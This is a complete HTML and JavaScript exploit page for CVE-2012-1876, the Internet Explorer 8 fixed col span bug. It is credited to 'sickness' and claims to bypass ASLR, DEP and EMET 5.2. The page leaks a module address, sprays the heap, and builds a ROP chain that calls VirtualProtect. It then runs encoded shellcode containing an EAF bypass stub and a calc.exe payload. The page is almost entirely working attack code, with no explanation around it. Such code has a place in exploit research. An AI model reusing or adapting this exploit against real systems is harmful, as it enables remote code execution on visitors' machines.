	<!--
** Internet Explorer 8 Fixed Col Span ID full ASLR, DEP and EMET 5.2 bypass
** Exploit Coded by sickness **
**protections covered: stack pivot, caller check, memprot, EAF, DEP, ASLR**
** changed the rop chains **
**Note: addition/removal of new rop gadgets will fuck up alignment issues with hardcoded offsets.

** Affected Software: Internet Explorer 8
** Vulnerability: Fixed Col Span ID
** CVE: CVE-2012-1876
** Tested on Windows 7 (base) (x64) - IE 8.0.7600.16385 & EMET 5.2 (no updates)
-->

<html>
<body>
<div id="evil"></div>
<table style="table-layout:fixed" ><col id="132" width="41" span="9" >Â  </col></table>
<script language='javascript'>

function strtoint(str) {
        return str.charCodeAt(1)*0x10000 + str.charCodeAt(0);
}

var free = "EEEE";
while ( free.length < 500 ) free += free;

var string1 = "AAAA";
while ( string1.length < 500 ) string1 += string1;

var string2 = "BBBB";
while ( string2.length < 500 ) string2 += string2;

var fr = new Array();
var al = new Array();
var bl = new Array();

var div_container = document.getElementById("evil");
div_container.style.cssText = "display:none";

for (var i=0; i < 500; i+=2) {
        fr[i] = free.substring(0, (0x100-6)/2);
        al[i] = string1.substring(0, (0x100-6)/2);
        bl[i] = string2.substring(0, (0x100-6)/2);
        var obj = document.createElement("button");
        div_container.appendChild(obj);
}

for (var i=200; i<500; i+=2 ) {
        fr[i] = null;
        CollectGarbage();
}

function heapspray(cbuttonlayout) {
    CollectGarbage();
    
//gadgets	
	var off=0x1a600;
	var rop = cbuttonlayout - off + 0x107ef; 
	var rop = rop.toString(16);
	alert(rop);
    var rop1 = rop.substring(4,8);					//xchg eax,esp
    var rop2 = rop.substring(0,4);

	var rop = cbuttonlayout - off + 0x107f0; 
	var rop = rop.toString(16);
    var ropnop1 = rop.substring(4,8);				//ret
    var ropnop2 = rop.substring(0,4);

	var rop = cbuttonlayout - off + 0x6982A  		//mov [eax],ecx
	var rop = rop.toString(16);
    var rop3 = rop.substring(4,8);
    var rop4 = rop.substring(0,4);

	var rop = cbuttonlayout - off + 0x1d8d  		//pop ecx
	var rop = rop.toString(16);
    var rop5 = rop.substring(4,8);
    var rop6 = rop.substring(0,4);

	var rop = cbuttonlayout - off + 0x164561  		//sub eax,4
	var rop = rop.toString(16);
    var rop7 = rop.substring(4,8);
    var rop8 = rop.substring(0,4);
	
	var rop = cbuttonlayout - off + 0x54b72			//call [eax]
	var rop = rop.toString(16);
    var rop9 = rop.substring(4,8);
    var rop10 = rop.substring(0,4);
	
	var rop = cbuttonlayout - off + 0x308			//virtualprotect pointer
	var rop = rop.toString(16);
    var rop11 = rop.substring(4,8);
    var rop12 = rop.substring(0,4);
	
	var rop = cbuttonlayout - off + 0x1048d			//pop eax
	var rop = rop.toString(16);
    var rop13 = rop.substring(4,8);
    var rop14 = rop.substring(0,4);
	

    var shellcode = unescape("%u4141%u4141%u4242%u4242%u4343%u4343"); // PADDING
    shellcode+= unescape("%u4141%u4141%u4242%u4242%u4343%u4343"); // PADDING
    shellcode+= unescape("%u4141%u4141"); // PADDING
    
	shellcode+= unescape("%u"+ropnop1+"%u"+ropnop2);  		// retn
	shellcode+= unescape("%u"+rop5+"%u"+rop6);				// pop ecx;retn
	shellcode+= unescape("%u"+rop1+"%u"+rop2);  			// xchg eax,esp;retn
	
	
	shellcode+= unescape("%u"+rop5+"%u"+rop6);				//pop ecx
	shellcode+= unescape("%u00d4%u076d");					//shellcode location
	shellcode+= unescape("%u"+rop3+"%u"+rop4);				//mov [eax],ecx
	
	shellcode+= unescape("%u"+rop5+"%u"+rop6);				//pop ecx
	shellcode+= unescape("%u00cc%u076d");					//writable location
	shellcode+= unescape("%u"+rop7+"%u"+rop8);				//sub eax,4
	shellcode+= unescape("%u"+rop3+"%u"+rop4);				//mov [eax],ecx

	shellcode+= unescape("%u"+rop5+"%u"+rop6);				//pop ecx
	shellcode+= unescape("%u0040%u0000");					//RWX 0x40
	shellcode+= unescape("%u"+rop7+"%u"+rop8);				//sub eax,4
	shellcode+= unescape("%u"+rop3+"%u"+rop4);				//mov [eax],ecx
	
	shellcode+= unescape("%u"+rop5+"%u"+rop6);				//pop ecx
	shellcode+= unescape("%u4000%u0000");					//size 0x4000
	shellcode+= unescape("%u"+rop7+"%u"+rop8);				//sub eax,4
	shellcode+= unescape("%u"+rop3+"%u"+rop4);				//mov [eax],ecx
	
	shellcode+= unescape("%u"+rop5+"%u"+rop6);				//pop ecx
	shellcode+= unescape("%u0000%u076d");					//base address from heap spray
	shellcode+= unescape("%u"+rop7+"%u"+rop8);				//sub eax,4
	shellcode+= unescape("%u"+rop3+"%u"+rop4);				//mov [eax],ecx
	
	shellcode+= unescape("%u"+rop5+"%u"+rop6);				//pop ecx
	shellcode+= unescape("%u"+rop9+"%u"+rop10);				//return address pointing to call [eax]\nret
	shellcode+= unescape("%u"+rop7+"%u"+rop8);				//sub eax,4
	shellcode+= unescape("%u"+rop3+"%u"+rop4);				//mov [eax],ecx
	
	shellcode+= unescape("%u"+rop5+"%u"+rop6);				//pop ecx
	shellcode+= unescape("%u"+rop11+"%u"+rop12);			//pointer vprotect
	shellcode+= unescape("%u"+rop7+"%u"+rop8);				//sub eax,4
	shellcode+= unescape("%u"+rop3+"%u"+rop4);				//mov [eax],ecx
	
	shellcode+= unescape("%u"+rop5+"%u"+rop6);				//pop ecx
	shellcode+= unescape("%u"+rop13+"%u"+rop14);			//pop eax
	shellcode+= unescape("%u"+rop7+"%u"+rop8);				//sub eax,4
	shellcode+= unescape("%u"+rop3+"%u"+rop4);				//mov [eax],ecx

	
	shellcode+= unescape("%u"+rop1+"%u"+rop2);  			// xchg eax,esp;retn
	
	
    shellcode+= unescape("%u9090%u9090");     
    shellcode+= unescape("%u9090%u9090");     
    
	

    shellcode+=unescape("%u9090%u8b64%u0025%u0000%u8100%u00ec%u0040%u6400%u30a1%u0000%u8b00%u0c40%u408b%u8b14%u1070%u00b9%u0010%ue800%u0000%u0000%u815f%u19ef%u0010%uF300%u83a4%u10c0%uef81%u1000%u0000%u3889");
	//EAF & stackpivot bypass
	shellcode+=unescape("%uC5E8%u0000%u6800%uFE98%u0E8A%uE850%u001D%u0000%u006A%uC8E9%u0000%uFF00%uE8D0%u00AC%u0000%u7E68%uE2D8%u5073%u04E8%u0000%u6A00%uFF00%u31D0%u8BFF%u2444%u3104%u03DB%u3C58%uD801%u3166%u83DB%u78C0%u008B%u4403%u0424%u7C3B%u0824%u3974%u588B%u0320%u245C%u8B04%u1848%uD231%uC031%uEB83%u8504%u74C9%u8351%u04C3%uC283%u8B02%u0333%u2474%u3104%u31FF%uACC0%uC084%u0774%uCFC1%u010D%uEBC7%u3BF2%u247C%u7508%uEB2A%u8BAA%u2458%u5C03%u0424%uD301%uC931%u8B66%u8B0B%u1C58%u5C03%u0424%uC901%uC901%uCB01%uEB83%u8B04%u8B1B%u2444%u0104%uEBD8%u3105%u49C0%uABEB%u595B%uFF5A%u31E3%uB0C0%u6430%u008B%u408B%u8B0C%u1440%u008B%u408B%uC310%uC031%u30B0%u8B64%u8B00%u0C40%u408B%u8B14%u8B00%u8B00%u1040%uE8C3%uFF33%uFFFF%u6163%u636C%u652E%u6578%u0000");
	//calc shellcode

    // Total spray should be 1000
    var padding = unescape("%u9090");
    while (padding.length < 1000)
        padding = padding + padding;
    var padding = padding.substr(0, 1000 - shellcode.length);

    shellcode+= padding;

    while (shellcode.length < 100000)
        shellcode = shellcode + shellcode;

    var onemeg = shellcode.substr(0, 64*1024/2);

    for (i=0; i<14; i++) {
        onemeg += shellcode.substr(0, 64*1024/2);
    }

    onemeg += shellcode.substr(0, (64*1024/2)-(38/2));

    var spray = new Array();

    for (i=0; i<100; i++) {
        spray[i] = onemeg.substr(0, onemeg.length);
    }
}

function leak(){
        var leak_col = document.getElementById("132");
        leak_col.width = "41";
        leak_col.span = "19";
}

function get_leak() {
        var str_addr = strtoint(bl[498].substring((0x100-6)/2+11,(0x100-6)/2+13));
        str_addr = str_addr - 1410704;
        var hex = str_addr.toString(16);
        //alert(hex);
        setTimeout(function(){heapspray(str_addr)}, 50);
}

function trigger_overflow(){
        var evil_col = document.getElementById("132");
        evil_col.width = "1245880";
        evil_col.span = "44";
}

setTimeout(function(){leak()}, 400);
setTimeout(function(){get_leak()},450);
setTimeout(function(){trigger_overflow()}, 700);

</script>
</body>
</html>
